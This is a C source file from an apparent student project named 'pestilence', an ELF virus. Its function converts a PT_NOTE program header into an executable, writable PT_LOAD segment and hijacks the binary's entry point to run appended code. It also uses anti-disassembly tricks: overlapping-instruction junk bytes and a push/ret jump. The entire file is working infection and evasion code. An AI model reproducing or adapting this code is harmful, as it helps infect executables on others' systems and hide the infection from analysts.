/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   increase_segment_sections.c                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: helmanso <helmanso@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/12 18:11:49 by helmanso          #+#    #+#             */
/*   Updated: 2021/07/15 10:02:21 by helmanso         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/pestilence.h"

void    increase_phdr(void *mapped, int size, int vsize, Elf64_Addr **addr)
{
    Elf64_Ehdr *exe_header;
    Elf64_Phdr *ph_header;
    int         i;
    char        *fake_address;
    exe_header = (Elf64_Ehdr *)mapped;
    ph_header = (Elf64_Phdr *)(mapped + exe_header->e_phoff);
    i = 0;

    
    if ((unsigned int)exe_header->e_phoff > size)
        exit_wrapper(1);
    asm volatile(
    "mov_ins:\n"
    "mov $2283, %%rax\n"
    "xor %%rax, %%rax\n"
    "jz mov_ins+3\n"
    ".byte 0xe8\n"
    : :
    : "%rax");

    fake_address = calc_addr(((char*)&&fake_label) - 0x400000);
    asm volatile(
        "push %0\n"
        "ret\n"
        ".string \"\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\""
        :
        : "g"(fake_address));
    fake_label:
        while (i < exe_header->e_phnum)
        {

            if (ph_header->p_type == PT_NOTE)
            {
                ph_header->p_type = PT_LOAD;
                ph_header->p_flags = PF_R | PF_X | PF_W;
                ph_header->p_vaddr = 0xc000000 + size;
                *addr = (Elf64_Addr *)exe_header->e_entry;
                exe_header->e_entry = ph_header->p_vaddr;
                ph_header->p_filesz += vsize;
                ph_header->p_memsz += vsize;
                ph_header->p_offset = size;
                ph_header->p_align = 0x200000;
            }
            ph_header++;
            i++;
        }
}
